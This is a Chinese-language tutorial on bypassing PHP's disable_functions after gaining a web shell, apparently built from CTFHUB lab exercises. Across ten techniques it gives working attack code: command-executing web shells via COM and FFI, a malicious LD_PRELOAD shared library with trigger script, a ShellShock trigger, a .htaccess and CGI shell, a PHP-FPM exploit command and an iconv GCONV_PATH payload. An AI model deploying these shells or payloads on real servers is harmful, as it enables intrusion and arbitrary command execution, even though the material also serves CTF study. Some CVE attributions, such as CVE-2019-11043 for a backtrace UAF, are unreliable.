# PHP `disable_functions` 绕过技术

## 概述 (Overview)

PHP 的 `php.ini` 配置文件中的 `disable_functions` 指令允许管理员禁止在 PHP 环境中使用某些特定的内置函数，通常是为了提高安全性，禁用诸如 `system()`, `exec()`, `shell_exec()`, `passthru()` 等可能执行操作系统命令的危险函数。绕过 `disable_functions` 的目标通常是在这种受限环境下找到替代方法来执行系统命令。`phpinfo()` 函数通常不会被禁用，是探测目标环境（如 PHP 版本、已加载扩展、`disable_functions` 具体列表等）的重要手段。

## 识别特征 / 使用场景 (Identification / Use Cases)

*   **识别:**
    *   获取 WebShell 后，尝试执行 `whoami`, `ls` 等命令失败，提示函数被禁用。
    *   通过 `phpinfo()` 输出查看到 `disable_functions` 指令及其列出的被禁函数。
*   **使用场景:**
    *   在已获得 WebShell 但无法直接执行系统命令的 PHP 环境中提升权限或执行进一步操作。
    *   适用于满足特定绕过技术条件的 Linux 或 Windows 服务器环境。

## 核心原理 (Core Principles - General)

绕过 `disable_functions` 的核心思路是寻找 PHP 与操作系统交互的替代途径，常见的原理包括：

1.  **利用未被禁用的、可执行命令或加载代码的函数/特性:** 如 Windows 下的 `COM` 对象。
2.  **利用环境变量和子进程:** 通过设置特殊环境变量（如 `LD_PRELOAD`, `GCONV_PATH`）并触发能创建子进程的函数（如 `mail()`, `error_log()`），使得子进程加载恶意代码。
3.  **利用 Web 服务器特定模块:** 如 Apache 的 `mod_cgi`，通过配置文件修改文件处理方式。
4.  **攻击 PHP-FPM 进程:** 如果能与 PHP-FPM 进程通信（通常监听 9000 端口），可以构造 FastCGI 请求来控制 PHP 配置项并执行代码。
5.  **利用 PHP 自身漏洞 (内存破坏):** 如特定版本存在的 UAF (Use-After-Free) 漏洞，通过精心构造的数据触发漏洞，最终劫持执行流程以调用 `system()` 等函数。
6.  **利用 PHP 新特性/扩展:** 如 PHP 7.4 引入的 FFI (Foreign Function Interface) 扩展。

---

## 常见绕过技术 (Common Bypass Techniques)

### 1. Windows COM 对象

*   **概述 (Overview):** 在 Windows 环境下，如果 PHP 加载了 `php_com_dotnet.dll` 扩展且允许 DCOM (`com.allow_dcom=true`)，可以通过 `COM` 对象调用系统组件（如 `WScript.shell`）来执行命令。
*   **工作原理 (Working Principle):** PHP 的 `COM` 类允许实例化和调用 COM 对象。`WScript.Shell` 对象提供了 `Exec` 方法，可以启动外部程序并获取其输出。
*   **利用条件 (Exploitation Conditions):**
    *   Windows 操作系统。
    *   PHP 开启 `php_com_dotnet.dll` 扩展。
    *   `phpinfo()` 中 `com.allow_dcom` 为 `On`。
    *   `COM` 类未被禁用。
*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
    ```php
    <?php
    // 检查 COM 是否可用
    if (extension_loaded('com_dotnet')) {
        try {
            $command = $_GET['cmd'];
            // 创建 WScript.Shell COM 对象
            $wsh = new COM('WScript.shell'); 
            // 执行命令 (Shell.Application 对象的 ShellExecute 方法也可以)
            $exec = $wsh->exec("cmd /c " . $command); 
            // 获取标准输出
            $stdout = $exec->StdOut();
            $stroutput = $stdout->ReadAll();
            echo "<pre>" . htmlspecialchars($stroutput) . "</pre>";
        } catch (Exception $e) {
            echo "COM Error: " . $e->getMessage();
        }
    } else {
        echo "COM extension is not loaded.";
    }
    ?>
    ```
    访问 `payload.php?cmd=whoami` 即可执行命令。

### 2. LD_PRELOAD (Linux)

*   **概述 (Overview):** `LD_PRELOAD` 是 Linux 动态链接器的一个环境变量。它允许用户指定在程序启动时优先加载的共享库 (`.so` 文件)。通过加载一个恶意的共享库，可以覆盖（劫持）目标进程将要调用的库函数（如 `getuid`），在被劫持的函数中执行任意代码。
*   **工作原理 (Working Principle):**
    1.  **编写恶意共享库 (`.so`):** 使用 C 语言编写一个共享库，其中包含一个与目标进程将要调用的函数同名的函数（如 `getuid`）。在这个自定义函数内部，执行我们想要执行的命令，并通常使用 `unsetenv("LD_PRELOAD")` 清除环境变量以防无限循环。
    2.  **利用 `__attribute__((constructor))`:** 更通用的方法是利用 GCC 的 `__attribute__((constructor))` 特性。标记为此属性的函数会在共享库被加载时（早于 `main` 函数执行）自动执行。这样就不需要精确劫持某个特定函数。
    3.  **设置环境变量:** 使用 PHP 的 `putenv()` 函数设置 `LD_PRELOAD` 环境变量，指向我们上传的恶意 `.so` 文件路径。
    4.  **触发子进程:** 调用一个能够 fork 出子进程的 PHP 函数，如 `mail()` 或 `error_log()`。当子进程启动时，它会继承父进程的环境变量，动态链接器会根据 `LD_PRELOAD` 加载我们的恶意 `.so` 文件，从而执行其中的代码。
*   **利用条件 (Exploitation Conditions):**
    *   Linux 操作系统。
    *   `putenv()` 函数可用。
    *   至少有一个能触发子进程的函数可用 (如 `mail()`, `error_log()`, `imagick` 扩展处理某些图片等)。
    *   目标网站有可写的目录，允许上传编译好的 `.so` 文件。
*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
    1.  **编写 `evil.c`:**
        ```c
        #include <stdlib.h>
        #include <unistd.h> // 如果需要 getuid 等

        // 可选：如果想劫持特定函数（例如 mail() 调用的 getuid）
        // uid_t getuid(void) {
        //     unsetenv("LD_PRELOAD");
        //     system("echo 'Hooked getuid!' > /tmp/ld_preload_success.txt");
        //     system(getenv("_evilcmd")); // 通过另一个环境变量传递命令
        //     return geteuid(); // 返回原始函数应该做的事
        // }

        // 推荐：使用 constructor，更通用
        __attribute__((constructor)) void evil_constructor() {
            unsetenv("LD_PRELOAD"); // 清除环境变量防止影响后续进程
            const char* cmd = getenv("_evilcmd"); // 从环境变量获取命令
            if (cmd != NULL) {
                system(cmd);
            } else {
                system("echo 'LD_PRELOAD success but _evilcmd not set' > /tmp/ld_preload_fallback.txt");
            }
        }
        ```
    2.  **编译 `.so` 文件:**
        ```bash
        gcc -shared -fPIC -o evil.so evil.c 
        ```
        (`-shared` 生成共享库, `-fPIC` 生成位置无关代码)
    3.  **编写 `trigger.php`:**
        ```php
        <?php
        // 获取要执行的命令，例如从 GET 参数
        $command = $_GET['cmd']; 
        if (empty($command)) {
            $command = "id"; // 默认命令
        }

        // 将命令写入输出文件，并重定向错误输出
        $output_file = "/var/www/html/output.txt"; // 确保此路径可写
        $shell_command = $command . " > " . $output_file . " 2>&1";

        // 设置包含命令的环境变量
        putenv("_evilcmd=" . $shell_command);

        // 设置 LD_PRELOAD 环境变量，指向上传的 .so 文件
        // 假设 evil.so 与 trigger.php 在同一目录
        putenv("LD_PRELOAD=./evil.so"); 

        // 触发子进程
        if (function_exists('mail')) {
            // 参数不重要，只是为了触发 sendmail 进程
            mail("a@a.com", "subject", "message", "From: b@b.com"); 
        } elseif (function_exists('error_log')) {
            // 向不存在的文件或邮件地址记录错误也会触发
            error_log("triggering preload", 1, "dummy@example.com"); 
        } else {
            die("No suitable function (mail or error_log) found to trigger LD_PRELOAD.");
        }

        // (可选) 等待命令执行完成并读取结果
        sleep(1); // 给点时间执行命令
        if (file_exists($output_file)) {
            echo "Command output:<pre>" . htmlspecialchars(file_get_contents($output_file)) . "</pre>";
            // unlink($output_file); // 清理
        } else {
            echo "Output file not found or command failed.";
        }
        ?>
        ```
    4.  **执行:** 上传 `evil.so` 和 `trigger.php` 到 Web 服务器的可写目录，然后访问 `trigger.php?cmd=ls -al /`。
*   **CTFHUB 示例 (CTFHUB Example):**
    ![LD_PRELOAD 1](/ctfhub/images/web1.png)
    (蚁剑连接)
    ![LD_PRELOAD 2](/ctfhub/images/web2.png)
    (上传 `evil.so` 和 `trigger.php`，然后访问 `trigger.php?cmd=tac /flag`)
    ![LD_PRELOAD 3](/ctfhub/images/web3.png)
    (获取 Flag)
*   **注意事项 (Considerations):** 需要 `putenv` 和一个能 fork 子进程的函数。蚁剑等工具有自动化此过程的插件。

### 3. ShellShock (Bash 漏洞 CVE-2014-6271)

*   **概述 (Overview):** ShellShock 是 GNU Bash 4.3 及更早版本中的一个严重漏洞。Bash 在处理特定构造的环境变量（其值包含一个函数定义 `() { :;};` 后跟额外字符串）时，会错误地执行函数定义后面的额外字符串作为命令。
*   **工作原理 (Working Principle):**
    1.  Bash 在初始化时会扫描环境变量。如果一个环境变量的值看起来像一个函数定义（以 `() {` 开头），Bash 会将其导入为当前 Shell 环境中的一个函数。
    2.  漏洞在于，Bash 在解析函数定义时，没有在结束花括号 `}` 后停止处理，而是继续执行了该环境变量值中 `}` 之后的任何命令。
    3.  **利用:** 构造一个环境变量，其值为 `() { <任意内容>; }; <要执行的命令>`。当一个新 Bash 进程（子进程）启动并导入这个环境变量时，`<要执行的命令>` 就会被意外执行。
    4.  **在 PHP 中:** 使用 `putenv()` 设置恶意的环境变量，然后调用 `mail()` 或 `error_log()` 触发子进程（通常是 `/bin/sh`，如果它链接到易受攻击的 Bash）。
*   **利用条件 (Exploitation Conditions):**
    *   目标系统使用的 Bash 版本 <= 4.3 且存在 ShellShock 漏洞。
    *   `/bin/sh` 链接到易受攻击的 Bash (常见情况)。
    *   `putenv()` 函数可用。
    *   至少有一个能触发子进程的函数可用 (如 `mail()`, `error_log()`)。
    *   攻击者能够控制传递给子进程的环境变量。
*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
    1.  **检测 Payload:**
        ```bash
        env x='() { :;}; echo vulnerable' bash -c "echo test" 
        ```
        如果输出包含 "vulnerable"，则存在漏洞。
    2.  **PHP 触发 Payload:**
        ```php
        <?php
        function runcmd_shellshock($command) {
            $output_file = "/var/www/html/output_shellshock.txt"; // 确保可写
            $shell_command = $command . " > " . $output_file . " 2>&1";
          
            // 检查所需函数是否可用
            if (function_exists('putenv') && (function_exists('error_log') || function_exists('mail'))) {
                // 设置包含函数定义和要执行命令的环境变量
                putenv("PHP_SHELLSHOCK=() { :; }; " . $shell_command);  
                
                // 触发子进程 (error_log 通常更可靠)
                if (function_exists('error_log')) {
                    error_log("triggering shellshock", 1); // 参数不重要
                } else {
                    mail("a@a.com", "a", "a", "a");
                }

                // 读取结果
                sleep(1); 
                if (file_exists($output_file)) {
                    echo "Command output:<pre>" . htmlspecialchars(file_get_contents($output_file)) . "</pre>";
                    // unlink($output_file); 
                } else {
                     echo "Output file not found or command failed.";
                }
            } else {
                print("Required functions (putenv and mail/error_log) not available.");
            }
        }

        // 从 GET 参数获取命令
        if(isset($_GET['cmd'])) {
            runcmd_shellshock($_GET['cmd']);
        } else {
            echo "Usage: ?cmd=<command>";
        }
        ?>
        ```
    3.  **执行:** 上传此 PHP 文件，访问 `shellshock_trigger.php?cmd=id`。
*   **CTFHUB 示例 (CTFHUB Example):**
    ![ShellShock 1](/ctfhub/images/web4.png)
    (提供蚁剑连接信息)
    ![ShellShock 2](/ctfhub/images/web5.png)
    (上传上述 PHP Payload，并访问 `payload.php?cmd=tac /flag`)
    ![ShellShock 3](/ctfhub/images/web6.png)
    (获取 Flag)

### 4. Apache Mod CGI

*   **概述 (Overview):** 如果 Apache 服务器配置不当，允许在 Web 目录下使用 `.htaccess` 文件覆盖配置，并且开启了 `mod_cgi` 模块，攻击者可以上传一个 `.htaccess` 文件来指示 Apache 将特定后缀（例如 `.wors`）的文件作为 CGI 脚本执行。然后上传一个该后缀的 Shell 脚本，访问它即可执行命令。
*   **工作原理 (Working Principle):**
    1.  **`.htaccess` 配置:** 攻击者在目标目录下创建一个 `.htaccess` 文件，内容类似：
        ```apache
        Options +ExecCGI
        AddHandler cgi-script .wors 
        ```
        *   `Options +ExecCGI`: 允许在该目录下执行 CGI 脚本。
        *   `AddHandler cgi-script .wors`: 告诉 Apache 将所有 `.wors` 后缀的文件交给 CGI 处理器处理。
    2.  **上传 Shell 脚本:** 上传一个具有自定义后缀（如 `shell.wors`）的 Shell 脚本，内容类似：
        ```bash
        #!/bin/bash
        echo "Content-type: text/plain" 
        echo "" 
        /bin/bash -c "id; ls -al; pwd; tac /flag" 
        ```
        **注意:** 脚本需要有可执行权限 (`chmod +x shell.wors`)，并且第一行 `#!/bin/bash` 指定解释器。输出前必须有 `Content-type` 头和空行。
    3.  **触发执行:** 当用户通过 Web 访问 `shell.wors` 时，Apache 会根据 `.htaccess` 的配置，将其作为 CGI 脚本执行，运行其中的 Shell 命令。
*   **利用条件 (Exploitation Conditions):**
    *   目标 Web 服务器是 Apache + PHP。
    *   Apache 加载了 `mod_cgi` 模块。
    *   目标 Web 目录的 Apache 配置中 `AllowOverride` 指令允许 `.htaccess` 文件覆盖 `Options` 和 `AddHandler` (通常需要 `AllowOverride All` 或至少 `AllowOverride Options FileInfo`)。
    *   目标目录可写，允许上传 `.htaccess` 和 Shell 脚本。
    *   能够设置上传的 Shell 脚本具有可执行权限 (通常通过 WebShell)。
*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
    1.  通过 WebShell 上传 `.htaccess` 文件 (内容如上)。
    2.  通过 WebShell 上传 `shell.wors` 文件 (内容如上)。
    3.  通过 WebShell 给 `shell.wors` 添加执行权限: `chmod +x shell.wors`。
    4.  在浏览器中访问 `http://target.com/path/to/shell.wors`。
*   **CTFHUB 示例 (CTFHUB Example):**
    ![Apache Mod CGI 1](/ctfhub/images/web7.png)
    (蚁剑连接，可查看 `phpinfo` 确认 Apache、mod_cgi、AllowOverride 等信息)
    ![Apache Mod CGI 2](/ctfhub/images/web8.png)
    (上传 `.htaccess` 和 `shell.wors`，并执行 `chmod +x shell.wors`)
    (访问 `shell.wors` 文件获取 Flag - 截图缺失)

### 5. PHP-FPM

*   **概述 (Overview):** PHP-FPM (FastCGI Process Manager) 是 PHP FastCGI 的一种实现，用于处理 Web 服务器（如 Nginx, Apache）转发过来的 PHP 请求。如果 PHP-FPM 监听的端口（默认为 `127.0.0.1:9000`）意外暴露在公网，或者攻击者可以通过 SSRF 或已有的 WebShell 访问到该端口，就可以直接构造 FastCGI 协议数据包与 PHP-FPM 通信，通过控制特定的 FastCGI 环境变量来执行任意 PHP 代码，从而绕过 `disable_functions`。
*   **工作原理 (Working Principle):**
    1.  **FastCGI 协议:** Web 服务器与 PHP-FPM 之间通过 FastCGI 协议通信。该协议基于 TCP 或 Unix Socket，传输的是结构化的数据包 (Record)，包含 Header 和 Body。
    2.  **环境变量:** 请求信息（如 URL、请求方法、服务器变量等）被编码为 FastCGI 的环境变量（类型 4 的 Record）发送给 PHP-FPM。关键环境变量包括 `SCRIPT_FILENAME` (指定要执行的 PHP 文件) 和 `DOCUMENT_ROOT`。
    3.  **未授权访问利用:** 如果能直接与 FPM 端口通信，攻击者可以构造恶意的 FastCGI 请求。
    4.  **代码执行:** 通过设置特定的 FastCGI 环境变量 `PHP_VALUE` 或 `PHP_ADMIN_VALUE`，可以动态修改 PHP 配置项。关键配置项包括：
        *   `auto_prepend_file = php://input`: 让 PHP 在执行 `SCRIPT_FILENAME` 指定的文件之前，先包含并执行 HTTP 请求 Body 中的内容。
        *   `allow_url_include = On`: 允许包含远程文件和 `php://` 伪协议。
    5.  **构造请求:** 攻击者构造一个 FastCGI 请求，其中：
        *   `SCRIPT_FILENAME` 指向一个目标服务器上**已存在**的 PHP 文件（因为 `security.limit_extensions` 通常限制只能执行 `.php` 文件，且文件必须存在）。
        *   设置 `PHP_VALUE` 或 `PHP_ADMIN_VALUE` 来开启 `allow_url_include` 和设置 `auto_prepend_file = php://input`。
        *   将要执行的 PHP 代码（例如 `<?php system('id'); ?>`）放在 FastCGI 请求的 Body 部分（通常是类型为 `FCGI_STDIN` 的 Record）。
    6.  **执行流程:** PHP-FPM 收到请求 -> 解析环境变量 -> 设置 PHP 配置 -> 准备执行 `SCRIPT_FILENAME` -> 执行 `auto_prepend_file` (即 `php://input`) -> 执行了 Body 中的 PHP 代码。
*   **利用条件 (Exploitation Conditions):**
    *   能够访问 PHP-FPM 监听的端口（TCP 或 Unix Socket）。通常是 `127.0.0.1:9000`，若配置错误或存在 SSRF 则可能从外部访问。
    *   知道目标服务器上至少一个存在的 PHP 文件的绝对路径（如 `/var/www/html/index.php`）。
    *   (通常需要) PHP 版本支持通过 `PHP_VALUE`/`PHP_ADMIN_VALUE` 修改 `auto_prepend_file` 和 `allow_url_include` (大多数版本可以)。
*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
    *   **工具:** 通常使用专门的工具（如 `fpm.py`, `fcgi_exp.go`）来构造和发送 FastCGI 请求。
    *   **命令示例 (使用 fpm.py):**
        ```bash
        # 假设目标 FPM 在 127.0.0.1:9000，已知 /var/www/html/index.php 存在
        python fpm.py 127.0.0.1 9000 /var/www/html/index.php -c "<?php system('id'); exit(); ?>"
        ```
        工具会构造包含上述环境变量和 Body 的 FastCGI 请求发送给 FPM。
*   **CTFHUB 示例 (利用已有 Webshell 和插件):**
    *   **原理:** 某些 WebShell 管理工具（如蚁剑）的绕过 `disable_functions` 插件利用了 PHP-FPM。它们通过已有的 WebShell 上传一个恶意的 PHP 扩展 (`.so`)，然后利用 PHP-FPM 加载这个扩展，启动一个新的、没有 `disable_functions` 限制的 PHP 进程（或修改当前 FPM worker 配置），并将后续的命令执行请求通过代理转发到这个“干净”的 PHP 环境执行。
    *   **条件:** 需要 WebShell，目标使用 PHP-FPM，存在可写目录上传 `.so`。
    ![PHP-FPM 1](/ctfhub/images/web9.png)
    (蚁剑连接)
    ![PHP-FPM 2](/ctfhub/images/web10.png)
    (使用蚁剑的 PHP-FPM/FastCGI 绕过插件)
    ![PHP-FPM 3](/ctfhub/images/web11.png)
    (成功执行命令获取 Flag)

### 6. GC UAF (PHP 7.0-7.3 垃圾回收器漏洞 - CVE-2016-5771 / Bug #72530)

*   **概述 (Overview):** 此漏洞利用 PHP 垃圾收集器 (Garbage Collector, GC) 处理特定循环引用对象时的逻辑缺陷，导致 Use-After-Free (UAF) 内存破坏。通过精心构造 PHP 对象和触发 GC，可以控制已释放的内存，最终修改函数指针以执行任意代码（如 `system()`）。
*   **工作原理 (Working Principle - 简化):**
    1.  **UAF 概念:** Use-After-Free 是指当一块内存被释放后，程序仍然保留着指向该内存的指针（悬垂指针），并在后续操作中通过该指针访问或修改已被释放的内存区域。此时该内存可能已被重新分配给其他数据，导致数据损坏、程序崩溃或被攻击者利用来控制执行流程。
    2.  **漏洞触发:** 通过 `unserialize()` 创建包含特定循环引用的对象结构。
    3.  **GC 介入:** 调用 `gc_collect_cycles()` 触发垃圾回收。由于 bug，GC 错误地释放了仍在使用的对象内存。
    4.  **内存占位与伪造:** 利用后续的操作（如创建新对象或字符串）来占据刚刚被释放的内存区域，并写入精心构造的数据（如伪造的对象结构、伪造的函数指针）。
    5.  **劫持执行流:** 当程序后续通过悬垂指针访问伪造的对象或调用其方法时，会跳转到攻击者指定的地址（如 `system()` 函数的地址），并以可控的参数执行。
*   **利用条件 (Exploitation Conditions):**
    *   PHP 版本: 7.0.x, 7.1.x, 7.2.x, 7.3.x (具体受影响范围需查证 CVE 和 Bug 报告)。
    *   Linux 操作系统 (Exploit 通常依赖 Linux 的内存布局和函数地址)。
    *   通常需要知道一些内存地址信息（Exploit 会尝试自动泄露）。
*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
    *   使用现成的 PoC exploit 代码（如笔记中提供的 `mm0r1` 的 PoC）。
    *   修改 PoC 中的命令 (`pwn("tac /flag");`) 为需要执行的命令。
    *   上传该 PHP 文件到目标服务器。
    *   通过 Web 访问该 PHP 文件触发漏洞利用。
*   **CTFHUB 示例 (CTFHUB Example):**
    ![GC UAF 1](/ctfhub/images/web12.png)
    (蚁剑连接)
    ![GC UAF 2](/ctfhub/images/web13.png)
    (上传修改好命令的 `gc_uaf_exploit.php`)
    ![GC UAF 3](/ctfhub/images/web14.png)
    (访问 exploit 文件获取 Flag)
*   **注意事项 (Considerations):** UAF 漏洞利用通常对特定 PHP 版本和环境敏感，可能不稳定。

### 7. Json Serialization UAF (PHP 7.1-7.3 JSON 序列化漏洞 - CVE-2019-11041 / Bug #77843)

*   **概述 (Overview):** 此漏洞存在于 PHP 的 JSON 序列化程序处理实现了 `JsonSerializable` 接口的对象时的逻辑缺陷，同样可导致 Use-After-Free (UAF)。利用方式与 GC UAF 类似，通过触发漏洞、内存占位和伪造数据，最终劫持执行流调用 `system()`。
*   **工作原理 (Working Principle - 简化):** 与 GC UAF 类似，但触发点是 `json_encode()` 函数处理包含特定结构（涉及实现了 `JsonSerializable` 接口的对象和引用）的数据时。
*   **利用条件 (Exploitation Conditions):**
    *   PHP 版本:
        *   7.1.x (all versions)
        *   7.2.x < 7.2.19
        *   7.3.x < 7.3.6
    *   Linux 操作系统。
*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
    *   使用现成的 PoC exploit 代码 (如笔记中提供的)。
    *   修改 PoC 中的命令 (`$cmd = "tac /flag";`)。
    *   上传 PHP 文件到目标服务器。
    *   访问该 PHP 文件触发利用。
*   **CTFHUB 示例 (CTFHUB Example):**
    ![Json Serialization UAF 1](/ctfhub/images/web15.png)
    (蚁剑连接)
    ![Json Serialization UAF 2](/ctfhub/images/web16.png)
    (上传修改好命令的 `json_uaf_exploit.php`)
    ![Json Serialization UAF 3](/ctfhub/images/web17.png)
    (访问 exploit 文件获取 Flag)
*   **注意事项 (Considerations):** 同 UAF 漏洞，可能不稳定，依赖特定环境。

### 8. Backtrace UAF (PHP 7.0-7.4 debug_backtrace 漏洞 - CVE-2019-11043 / Bug #76047)

*   **概述 (Overview):** PHP 的 `debug_backtrace()` 或 `Exception->getTrace()` 函数在处理某些涉及对象析构的场景时，可能返回一个指向已被销毁变量的引用，从而导致 Use-After-Free (UAF)。利用原理与其他 UAF 类似。
*   **工作原理 (Working Principle - 简化):** 通过构造特定的类和函数调用顺序，使得在 `__destruct` 方法内调用 `debug_backtrace()` 时，其返回的参数数组中包含了对刚刚被销毁的变量的引用。后续操作这个引用即可触发 UAF。
*   **利用条件 (Exploitation Conditions):**
    *   PHP 版本:
        *   7.0.x (all versions)
        *   7.1.x (all versions)
        *   7.2.x (all versions)
        *   7.3.x < 7.3.15
        *   7.4.x < 7.4.3
    *   Linux 操作系统。
*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
    *   使用现成的 PoC exploit 代码 (如笔记中提供的)。
    *   修改 PoC 中的命令 (`pwn("tac /flag");`)。
    *   上传 PHP 文件。
    *   访问该 PHP 文件。
*   **CTFHUB 示例 (CTFHUB Example):**
    ![Backtrace UAF 1](/ctfhub/images/web18.png)
    (蚁剑连接)
    ![Backtrace UAF 2](/ctfhub/images/web19.png)
    (上传修改好命令的 `backtrace_uaf_exploit.php`)
    ![Backtrace UAF 3](/ctfhub/images/web20.png)
    (访问 exploit 文件获取 Flag)
*   **注意事项 (Considerations):** 同 UAF 漏洞。

### 9. FFI (Foreign Function Interface) 扩展 (PHP >= 7.4)

*   **概述 (Overview):** FFI 是 PHP 7.4 版本引入的一个官方扩展，允许 PHP 代码直接调用 C 语言编写的函数和使用 C 语言的数据结构。如果 FFI 扩展被启用 (`ffi.enable=true`)，并且 `FFI` 类未被禁用，攻击者可以直接通过 FFI 调用 C 标准库中的 `system()` 函数来执行命令。
*   **工作原理 (Working Principle):**
    1.  **声明接口:** 使用 `FFI::cdef()` 方法声明要调用的 C 函数的原型（例如 `int system(const char *command);`）。PHP FFI 会在运行时查找并链接到包含该函数的库（通常是 libc）。
    2.  **调用函数:** 通过 FFI 对象直接调用声明的 C 函数，就像调用 PHP 函数一样 (`$ffi->system("command");`)。
*   **利用条件 (Exploitation Conditions):**
    *   PHP 版本 >= 7.4。
    *   PHP 编译时包含 FFI 扩展。
    *   `php.ini` 中 `ffi.enable` 设置为 `On` (注意，CLI SAPI 下默认为 `On`，其他 SAPI 如 FPM 默认为 `preload`，需要预加载才能用)。
    *   `FFI` 类及其方法未在 `disable_classes` 或 `disable_functions` 中被禁用。
*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
    ```php
    <?php
    // 检查 FFI 是否可用
    if (extension_loaded('ffi') && ini_get('ffi.enable') === '1') { // 检查 ffi.enable=true
        try {
            // 声明要调用的 system 函数
            $ffi = FFI::cdef("int system(const char *command);"); 
            
            // 获取命令 (例如从 GET 参数)
            $command = isset($_GET['cmd']) ? $_GET['cmd'] : 'id'; 

            // (可选) 将输出重定向到文件，以便读取
            $output_file = "/var/www/html/ffi_output.txt"; // 确保可写
            $command_with_redir = $command . " > " . $output_file . " 2>&1";

            // 通过 FFI 调用 system 函数
            $ffi->system($command_with_redir); 

            // 读取并显示结果
            if (file_exists($output_file)) {
                echo "Command output:<pre>" . htmlspecialchars(file_get_contents($output_file)) . "</pre>";
                // @unlink($output_file); // 清理
            } else {
                echo "Output file not found or command failed.";
            }

        } catch (FFI\Exception $e) {
            echo "FFI Error: " . $e->getMessage();
        }
    } else {
        echo "FFI extension is not loaded or not enabled (ffi.enable must be On).";
    }
    ?>
    ```
*   **CTFHUB 示例 (CTFHUB Example):**
    ![FFI扩展 1](/ctfhub/images/web21.png)
    (蚁剑连接)
    ![FFI扩展 2](/ctfhub/images/web22.png)
    (上传上述 FFI exploit PHP 文件)
    ![FFI扩展 3](/ctfhub/images/web23.png)
    (访问 exploit 文件，通过 GET 参数传递命令，如 `?cmd=tac /flag`)

### 10. iconv (GCONV_PATH 环境变量 - Linux)

*   **概述 (Overview):** PHP 的 `iconv` 系列函数（用于字符集转换）在底层通常调用 glibc 库的 `iconv` 实现。glibc 的 `iconv_open()` 函数可以通过 `GCONV_PATH` 环境变量来加载用户自定义的字符集转换模块 (`.so` 文件)。攻击者可以利用这一点，通过 `putenv()` 设置 `GCONV_PATH` 指向包含恶意配置 (`gconv-modules`) 和恶意共享库 (`.so`) 的目录，然后调用 `iconv()` 函数（或其他触发 iconv 调用的函数/过滤器）来加载并执行恶意 `.so` 文件中的代码。
*   **工作原理 (Working Principle):**
    1.  **`gconv-modules` 文件:** 这是一个配置文件，列出了字符集名称及其对应的转换模块 (`.so` 文件) 和函数。攻击者创建一个自定义的 `gconv-modules` 文件，指定一个自定义的字符集名称（如 `PWN`)，并将其映射到自己编译的恶意 `.so` 文件中的 `gconv_init` 和 `gconv` 函数。
        ```
        # gconv-modules file content (e.g., save as /tmp/gconv-modules)
        # Define a custom conversion from PWN charset to UTF-8
        # module  FROM_CHARSET  TO_CHARSET  MODULE_PATH  COST
        module  PWN//           UTF-8//     ./pwn      1 
        # (MODULE_PATH is relative to GCONV_PATH directory, here ./pwn means /tmp/pwn.so)
        ```
    2.  **恶意 `.so` 文件 (`pwn.so`):** 编写一个 C 文件 (`pwn.c`)，包含 `gconv_init()` 或 `gconv()` 函数。在这些函数（通常是 `gconv_init`，因为它在加载时执行）中加入执行系统命令的代码。
        ```c
        // pwn.c
        #include <stdio.h>
        #include <stdlib.h>

        // This function is called when the module is loaded
        void gconv_init() {
            // Execute the command (e.g., get command from environment variable)
            const char* cmd = getenv("_iconv_cmd");
            if (cmd != NULL) {
                system(cmd);
            } else {
                system("echo 'iconv bypass success, _iconv_cmd not set' > /tmp/iconv_fallback.txt");
            }
            // Exit cleanly to avoid crashing the parent PHP process (optional but good practice)
            exit(0); 
        }

        // This function is called for the actual conversion (can also be used)
        void gconv() {
            // Could also put payload here, gconv_init is usually preferred
            exit(0); 
        }
        ```
        编译: `gcc -shared -fPIC -o pwn.so pwn.c`
    3.  **设置 `GCONV_PATH`:** 使用 `putenv()` 设置 `GCONV_PATH` 环境变量，使其指向存放 `gconv-modules` 文件的目录 (例如 `putenv("GCONV_PATH=/tmp");`)。
    4.  **设置命令环境变量:** 使用 `putenv()` 设置一个包含要执行命令的环境变量 (例如 `putenv("_iconv_cmd=id > /tmp/iconv_out.txt");`)。
    5.  **触发 `iconv` 调用:** 调用 PHP 的 `iconv()` 函数，使用自定义的字符集名称作为转换源或目标 (例如 `iconv("PWN", "UTF-8", "test");`)。这会使 glibc 加载 `/tmp/pwn.so` 并执行 `gconv_init()` 中的代码。
*   **利用条件 (Exploitation Conditions):**
    *   Linux 操作系统。
    *   `putenv()` 函数可用。
    *   PHP 安装并启用了 `iconv` 扩展。
    *   存在可写的目录 (如 `/tmp`) 用于上传 `gconv-modules` 和 `pwn.so` 文件。
    *   `iconv()` 函数本身未被禁用 (或者可以使用其他触发 iconv 的方式)。
*   **利用步骤 / 示例 Payload (Exploitation Steps / Example Payload):**
    1.  上传编译好的 `pwn.so` 到 `/tmp/pwn.so`。
    2.  上传 `gconv-modules` 文件 (内容如上) 到 `/tmp/gconv-modules`。
    3.  编写并上传触发 PHP 脚本 `iconv_trigger.php`:
        ```php
        <?php
        $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';
        $output_file = '/tmp/iconv_out.txt'; // Ensure /tmp is writable
        $cmd_with_redir = $cmd . ' > ' . $output_file . ' 2>&1';
        
        putenv("GCONV_PATH=/tmp"); // Point to directory with gconv-modules
        putenv("_iconv_cmd=" . $cmd_with_redir); // Pass command via env var

        // Trigger iconv using the custom charset "PWN"
        if (function_exists('iconv')) {
            @iconv("PWN", "UTF-8", "test"); // The string "test" is arbitrary
        } else {
            die("iconv function is disabled.");
        }

        // Read output
        sleep(1);
        if (file_exists($output_file)) {
            echo "Command output:<pre>" . htmlspecialchars(file_get_contents($output_file)) . "</pre>";
            // @unlink($output_file);
            // It's tricky to cleanup gconv-modules and pwn.so from within the triggered payload easily
        } else {
            echo "Output file not found or command failed.";
        }
        ?>
        ```
    4.  访问 `iconv_trigger.php?cmd=ls -al /`。
*   **CTFHUB 示例 (CTFHUB Example):**
    ![iconv 1](/ctfhub/images/iconv1.png)
    (上传 `gconv-modules` 到 `/tmp`)
    ![iconv 2](/ctfhub/images/iconv2.png)
    (上传编译好的 `pwn.so` 到 `/tmp`)
    ![iconv 3](/ctfhub/images/iconv3.png)
    (上传 `iconv_trigger.php`)
    ![iconv 4](/ctfhub/images/iconv4.png)
    (访问 `iconv_trigger.php?cmd=tac /flag` 获取 Flag)

